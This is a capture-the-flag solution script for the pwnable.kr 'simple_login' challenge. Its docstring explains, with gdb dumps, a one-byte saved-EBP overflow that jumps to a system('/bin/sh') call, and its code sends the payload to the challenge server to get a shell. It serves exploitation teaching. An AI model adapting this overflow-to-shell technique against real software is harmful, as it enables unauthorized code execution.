from pwn import *
from base64 import b64encode

"""
pwnable.kr - simple_login solution with only one byte overflow instead of four


I only saw writeups using the full four bytes overflow to fully
control EBP. In this writeup I'll show you how to get RCE with 
a single byte overflow.

The idea is that we have an 8 byte buffer followed by *EBP in 
which we are able to write up to 12 bytes. Hence we can get
control of EBP. But, just overflowing the LSB of *EBP is enough 
for RCE.


main()
```
  printf("Authenticate : ");
  __isoc99_scanf(&DAT_080da6b5,local_32);
  memset(input,0,0xc);
  local_38 = (void *)0x0;
  DECODED_LENGTH = Base64Decode(local_32,&local_38);  // 1
  if (DECODED_LENGTH < 13) {                          // 2
    memcpy(input,local_38,DECODED_LENGTH);
    iVar1 = auth(DECODED_LENGTH);                     // 3
    if (iVar1 == 1) {
      correct();
     
      
```
User input is base64 decoded [1]. The length is checked to be < 13 [2].
If length is < 13, we call auth()


```
bool auth(size_t param_1)

{
  int iVar1;
  undefined local_18 [8];
  char *local_10;
  undefined auStack12 [8];
  
  memcpy(auStack12,input,param_1);            // 1
  local_10 = (char *)calc_md5(local_18,0xc);
  printf("hash : %s\n",local_10);
  iVar1 = strcmp("f87cd601aa7fedca99018a8be88eda34",local_10);
  return iVar1 == 0;
}
```
Here we clearly have an overflow. The buffer is only 8 bytes in size
and we can write up to 12 bytes into it [1]. Looking at this in gdb
shows, that the auStack12 var is followed by *EBP. Hence this allows
us to get control over EBP which let's us modify the control flow.


```
(gdb) disassemble 
Dump of assembler code for function auth:
    <snip>
 => 0x080492ba <+30>:	call   0x8069660 <memcpy>
(gdb) x/wx $ebp
0xffffce38:	0xffffce88      // 1
```
Before the memcpy *EBP is 0xffffce88 [1], make a mental note of 
that value. 

Our stack looks like this.
```
(gdb) x/20wx $esp
0xffffce10:	0xffffce30	0x0811eb40	0x00000009	0x08120aa8
0xffffce20:	0x08120aa8	0x081209e8	0x00000009	0x00000009
0xffffce30:	0x080481d0	0x00000000	0xffffce88	0x08049407      // here we have our 0xffffce88
0xffffce40:	0x00000009	0x081209b8	0x00000009	0x00000000
0xffffce50:	0x00000001	0xffffcf14	0x081209b8	0x37370001
```

Setting the next breakpoint just after the memcpy and looking
at the stack and EBP again.

```
(gdb) x/wx $ebp
0xffffce38:	0xffffce2c      // see how this value changed?

(gdb) x/20wx $esp
0xffffce10:	0xffffce30	0x0811eb40	0x00000009	0x08120aa8
0xffffce20:	0x08120aa8	0x081209e8	0x00000009	0x00000009
0xffffce30:	0xdeadbeef	0x35333232	0xffffce2c	0x08049407      // here you can see the overflow happen
0xffffce40:	0x00000009	0x081209b8	0x00000009	0x00000000
0xffffce50:	0x00000001	0xffffcf14	0x081209b8	0x37370001
```

As you might have observed, we wrote our user input starting
at address 0xffffce30 and overflowed into the LSB of *EBP.

The user input was base64(p32(0xdeadbeef) + "2235\x2c".
And the "\x2c" was the value which overwrote the LSB of *EBP.

After we now leave the auth() function and get into main() again,
the stack around EBP looks like this:

```
Breakpoint 2, 0x08049407 in main ()
(gdb) x/20wx $ebp
0xffffce2c:	0x081209e8	0xdeadbeef	0x35333232	0xffffce2c
<snip>
```

Now if the leave instruction is executed at the end of the main() function
ESP points at our 0xdeadbeef value:

```
(gdb) disassemble 
Dump of assembler code for function main:
   <snip>
   0x08049424 <+279>:	leave  
=> 0x08049425 <+280>:	ret    

(gdb) x/2wx $esp
0xffffce30:	0xdeadbeef	0x35333232
```

And a single step now wants to hand code execution to 0xdeadbeef:

```
(gdb) si
0xdeadbeef in ?? ()
```

To get a shell we can simply jump into the middle of the correct
function:

```
void correct(void)
{
  if (input._0_4_ == -559038737) {
    puts("Congratulation! you are good!");
    system("/bin/sh");        // we want to jmp here
  }
  exit(0);

}

// disassembly

08049276 75 18           JNZ        LAB_08049290
08049278 c7 04 24        MOV        dword ptr [ESP]=>local_2c,s_Congratulation!_yo   = "Congratulation! you are good!" // Here we will jmp to
                 51 a6 0d 08
0804927f e8 4c 30        CALL       puts                                             int puts(char * __s)
                 01 00
08049284 c7 04 24        MOV        dword ptr [ESP]=>local_2c,s_/bin/sh_080da66f     = "/bin/sh"      
                 6f a6 0d 08
0804928b e8 20 20        CALL       system                                           int system(char * __command)
                 01 00


```

Therefore using the input base64(p32(0x08049278 + "WAYN" + "\x2c")) gives you a shell.
"""


our_input = p32(0x8049278) + b"2235\x2c"
authcode = b64encode(our_input)

while 1:
    #p = process("./login")
    p = remote("pwnable.kr", 9003)
    p.sendlineafter("Authenticate :", authcode)
    data = p.recvuntil(b"\n")
    try:
        data = p.recvuntil(b"\n")
        print(data)
        if b"Congratulation! you are good!" in data:
            p.interactive()
            break
        else:
            continue
    except:
        continue


